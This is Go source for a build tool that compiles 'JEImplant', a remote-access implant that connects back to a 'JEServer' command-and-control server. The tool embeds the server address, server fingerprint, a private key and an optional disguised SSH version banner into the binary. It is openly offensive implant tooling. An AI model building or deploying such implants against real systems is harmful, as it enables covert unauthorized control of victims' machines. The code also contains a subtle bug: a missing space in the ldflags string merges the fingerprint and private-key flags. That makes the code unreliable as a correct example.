// Program buildjeimplant builds JEImplant
package main

/*
 * buildjeimplant.go
 * Build an implant, getting all the needed info
 * By J. Stuart McMurray
 * Created 20220402
 * Last Modified 20220402
 */

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/magisterquis/jec2/pkg/common"
)

var (
	/* codeDir is where the code lives, settable at compile time. */
	codeDir = filepath.Join(".", "cmd", "jeimplant")
)

func main() {
	var (
		workDir = flag.String(
			"work-dir",
			"jec2",
			"JEServer's work dir",
		)
		versionString = flag.String(
			"version-banner",
			"",
			"Implant SSH version `banner`",
		)
		dryRun = flag.Bool(
			"dry-run",
			false,
			"Print the build command but do not run it",
		)
		keyName = flag.String(
			"implant-key",
			"",
			"Optional implant key filename, created if "+
				"nonexistent",
		)
		serverAddr = flag.String(
			"server",
			"",
			"Optional server address, in `proto://addr:port` form",
		)
		serverFP = flag.String(
			"server-fp",
			"",
			"Optional server fingerprint, in `SHA256:...` form",
		)
		serverKeyName = flag.String(
			"server-key",
			"",
			"Optional server public key file",
		)
		outFile = flag.String(
			"out",
			"jeimplant",
			"Output `filename",
		)
	)
	flag.StringVar(
		&codeDir,
		"source",
		codeDir,
		"JEImplant source `direcotry`",
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

Builds a JEImplant binary suitable for connecting to JEServer, doing its best
to work out fingerprints and so on.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Make sure we have go. */
	b, err := exec.Command("go", "version").CombinedOutput()
	if nil != err {
		log.Fatalf("Error checking for Go version: %s", err)
	}
	log.Printf("Go version: %s", strings.TrimSpace(string(b)))

	/* Get the important bits of the config. */
	var conf struct {
		Listeners struct {
			SSH string
			TLS string
		}
	}
	cn := filepath.Join(*workDir, common.ConfigName)
	b, err = os.ReadFile(cn)
	if nil != err {
		log.Printf("Error reading server config file %s: %s", cn, err)
	} else {
		if err := json.Unmarshal(b, &conf); nil != err {
			log.Fatalf("Parsing config file %s: %s", cn, err)
		}
		log.Printf("Parsed server's config")
	}

	/* Get our own key. */
	key := MustGetImplantKey(*workDir, *keyName)

	/* Work out the server's address. */
	switch {
	case "" != *serverAddr:
		/* User gave us one. */
	case "" != conf.Listeners.SSH:
		*serverAddr = "ssh://" + conf.Listeners.SSH
	case "" != conf.Listeners.TLS:
		*serverAddr = "tls://" + conf.Listeners.TLS
	default:
		log.Fatalf("Unable to determine server's address")
	}
	log.Printf("Server address: %s", *serverAddr)

	/* Get the server's fingerprint. */
	if "" == *serverFP {
		*serverFP = MustGetServerFP(
			*workDir,
			*serverKeyName,
			*serverAddr,
		)
	}
	if !strings.HasPrefix(*serverFP, "SHA256:") {
		log.Fatalf(
			"Server fingerprint %q doesn't start with SHA:256",
			*serverFP,
		)
	}
	log.Printf("Server fingerprint: %s", *serverFP)

	/* Roll ldflags. */
	ldflags := fmt.Sprintf(
		"-X main.ServerAddr=%s -X main.ServerFP=%s-X main.PrivKey=%s",
		*serverAddr,
		*serverFP,
		key,
	)
	if "" != *versionString {
		ldflags += fmt.Sprintf(
			" -X main.SSHVersion=%s",
			*versionString,
		)
	}

	/* Build the thing. */
	cmd := exec.Command(
		"go",
		"build",
		"-ldflags", ldflags,
		"-trimpath",
		"-o", *outFile,
		codeDir,
	)
	if *dryRun {
		fmt.Printf("%s\n", strings.Join(cmd.Args, " "))
		return
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	log.Printf("Starting build")
	if err := cmd.Run(); nil != err {
		log.Fatalf("Error running build command: %s", err)
	}
	log.Printf("Build finished")
}
